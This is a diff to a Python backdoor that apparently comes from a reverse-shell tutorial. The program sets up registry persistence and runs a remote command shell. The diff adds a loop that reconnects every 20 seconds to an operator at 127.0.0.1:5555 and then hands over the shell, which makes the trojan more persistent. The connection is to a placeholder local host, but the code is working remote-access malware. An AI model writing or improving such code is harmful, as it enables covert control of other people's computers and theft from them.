@@ -8,6 +8,7 @@ import threading
 import shutil
 import sys
 import subprocess
+import time
 
 
 def reliable_send(data):
@@ -64,6 +65,18 @@ def persis(reg_name, copy_name):
         reliable_send('Error creating persistence!')
 
 
+def connection():
+    while True:
+        time.sleep(20)
+        try:
+            s.connect(('127.0.0.1', 5555))
+            shell()
+            s.close()
+            break
+        except:
+            connection()
+
+
 def shell():
     while True:
         command = reliable_recv()
@@ -113,5 +126,4 @@ def shell():
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.1', 5555))
-shell()
+connection()
